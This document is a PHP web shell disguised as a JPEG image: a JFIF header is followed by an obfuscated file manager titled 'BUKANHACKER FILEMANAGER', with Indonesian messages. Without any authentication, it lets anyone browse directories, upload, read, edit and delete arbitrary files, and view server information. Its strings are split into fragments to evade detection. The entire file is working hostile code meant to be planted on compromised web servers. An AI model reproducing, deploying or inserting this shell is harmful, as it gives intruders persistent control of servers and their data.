ÿØÿà JFIF  ` `  ÿþ<?php
$dir = isset($_GET['d'.'i'.'r']) ? hex2bin($_GET['d'.'ir']) : '.';
$files = scandir($dir);
$upload_message = '';
$edit_message = '';
$delete_message = '';

function get_file_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function is_writable_permission($file) {
    return is_writable($file);
}

if (isset($_FILES['fi'.'le'.'_up'.'lo'.'ad'])) {
    if (move_uploaded_file($_FILES['fi'.'le_u'.'plo'.'ad']['t'.'mp_n'.'a'.'me'], $dir . '/' . $_FILES['fi'.'le_upl'.'oad']['nam'.'e'])) {
        $upload_message = 'Fi'.'le'.' ber'.'has'.'i'.'l di'.'un'.'gg'.'ah.';
    } else {
        $upload_message = 'Gag'.'a'.'l m'.'e'.'ng'.'un'.'g'.'gah file.';
    }
}

if (isset($_POST['ed'.'it'.'_f'.'il'.'e'])) {
    $file = $_POST['ed'.'it'.'_fil'.'e'];
    $content = file_get_contents($file); // membaca isi file yang ingin diedit
    if ($content !== false) {
        echo '<f'.'or'.'m m'.'et'.'ho'.'d="'.'p'.'os'.'t" ac'.'ti'.'on'.'="">'; // buat form baru untuk menampilkan textarea dan tombol Submit
        echo '<te'.'x'.'tar'.'ea i'.'d="'.'Co'.'p'.'yF'.'rom'.'Tex'.'tA'.'rea" na'.'me="fi'.'le'.'_c'.'ont'.'en'.'t" ro'.'w'.'s="1'.'0" c'.'la'.'ss'.'="f'.'or'.'m-c'.'ont'.'rol">' . htmlspecialchars($content) . '<'.'/t'.'ex'.'ta'.'rea>';
        echo '<i'.'np'.'ut ty'.'pe'.'="h'.'id'.'den" na'.'me'.'="ed'.'it'.'ed_'.'fi'.'le" v'.'al'.'ue="' . htmlspecialchars($file) . '">';
        echo '<b'.'utt'.'on'.' ty'.'e="s'.'ub'.'mit'.'" na'.'me'.'="su'.'bmi'.'t_edi'.'t" cla'.'ss='.'"bt'.'n'.' btn'.'-o'.'ut'.'li'.'ne'.'-lig'.'ht">Su'.'bmit</b'.'utt'.'on>';
        echo '</fo'.'rm>';
    } else {
        $edit_message = 'G'.'aga'.'l me'.'mb'.'ac'.'a i'.'si'.' fil'.'e.';
    }
}

if (isset($_POST['su'.'bmi'.'t_ed'.'it'])) {
    $file = $_POST['ed'.'it'.'ed_fi'.'le'];
    $content = $_POST['fi'.'le_'.'con'.'tent'];
    if (file_put_contents($file, $content) !== false) {
        $edit_message = 'Fi'.'le'.' be'.'rh'.'as'.'il'.' di'.'ed'.'it.';
    } else {
        $edit_message = 'G'.'ag'.'al m'.'eng'.'ed'.'it '.'fi'.'le.';
    }
}

if (isset($_POST['de'.'le'.'te'.'_fi'.'le'])) {
    $file = $_POST['de'.'let'.'e_f'.'i'.'le'];
    if (unlink($file)) {
        $delete_message = 'Fi'.'le b'.'er'.'has'.'il dih'.'apu'.'s.';
    } else {
        $delete_message = 'Ga'.'ga'.'l m'.'eng'.'ha'.'pus'.' fi'.'le.';
    }
}

$uname = php_uname();
$current_dir = realpath($dir);
?>

<!DOCTYPE html>
<html>
<head>
    <?php echo'<t'.'it'.'l'.'e>'.'B'.'UK'.'AN'.'HA'.'C'.'KE'.'R FI'.'L'.'EM'.'N'.'AG'.'ER</'.'tit'.'l'.'e>'?>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        header {
            background-color: #4CAF50;
            color: white;
            padding: 1rem;
        }
        header h1 {
            margin: 0;
        }
        main {
            padding: 1rem;
        }
        table {
            border-collapse: collapse;
            margin: 1rem auto;
            width: 50%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 0.5rem;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
        tr:nth-child(even) {
            background-color: #f2f2f2;
        }
        tr:hover {
            background-color: #ddd;
        }
        form {
            display: inline-block;
            margin: 1rem 0;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            border: none;
            color: white;
            cursor: pointer;
            margin-left: 1rem;
            padding: 0.5rem 1rem;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 12px;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <header>
        <?php echo'<h1>SI'.'MP'.'EL BA'.'NG'.'ET'.' NI'.'H S'.'HE'.'LL</h1>'?>
    </header>
    <? echo'<mai'.'n>
        <p>Cu'.'rre'.'nt'.' di'.'rec'.'tor'.'y: '?><?php echo $current_dir; ?></p>
        <? echo'<p'.'>Se'.'r'.'ve'.'r inf'.'or'.'m'.'ati'.'on'.': '?><?php echo $uname; ?></p>
        <?php if (!empty($upload_message)): ?>
        <p><?php echo $upload_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($edit_message)): ?>
        <p><?php echo $edit_message; ?></p>
        <?php endif; ?>
        <?php if (!empty($delete_message)): ?>
        <p><?php echo $delete_message; ?></p>
        <?php endif; ?>
        <?php echo'<f'.'orm '.'met'.'ho'.'d="P'.'OS'.'T" enc'.'typ'.'e="m'.'ult'.'ipa'.'rt/fo'.'rm-d'.'ata">
            <la'.'b'.'el>U'.'pl'.'oa'.'d fi'.'l'.'e:</'.'la'.'be'.'l>
            <in'.'put'.' typ'.'e="f'.'i'.'le" nam'.'e="fi'.'le_u'.'pl'.'oad">
            <in'.'put'.' typ'.'e="su'.'bm'.'it" va'.'lue'.'="Up'.'lo'.'ad">
            <i'.'n'.'put '.'typ'.'e="'.'h'.'id'.'de'.'n" n'.'ame="'.'dir" va'.'lu'.'e="'?><?php echo $dir; ?><?php echo'">'?>
        <?php echo'</fo'.'rm>
        <t'.'abl'.'e>
            <t'.'r>
                <th'.'>F'.'ile'.'na'.'me'.'</'.'th>
                <t'.'h>Pe'.'rm'.'iss'.'io'.'ns'.'</th>
                <t'.'h'.'>Ac'.'ti'.'on'.'s</th>
</'.'tr>'?>
<?php foreach ($files as $file): ?>
<tr>
    <td>
        <?php if (is_dir($dir . '/' . $file)): ?>
        <a href="?dir=<?php echo bin2hex($dir . '/' . $file); ?>"
            style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></a>
        <?php else: ?>
        <span style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'inherit' : 'red'; ?>"><?php echo $file; ?></span>
        <?php endif; ?>
    </td>
    <td style="color: <?php echo is_writable_permission($dir . '/' . $file) ? 'green' : 'red'; ?>">
        <?php echo is_file($dir . '/' . $file) ? get_file_permissions($dir . '/' . $file) : (is_writable_permission($dir . '/' . $file) ? 'Directory' : 'Directory (No writable)'); ?>
    </td>
    <td>
        <?php if (is_file($dir . '/' . $file)): ?>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="edit_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Edit</button>
        </form>
        <form action="" method="post" style="display: inline-block;">
            <input type="hidden" name="delete_file" value="<?php echo $dir . '/' . $file; ?>">
            <button type="submit" class="btn btn-outline-light">Delete</button>
        </form>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</table>
</main>
</body>
</html>
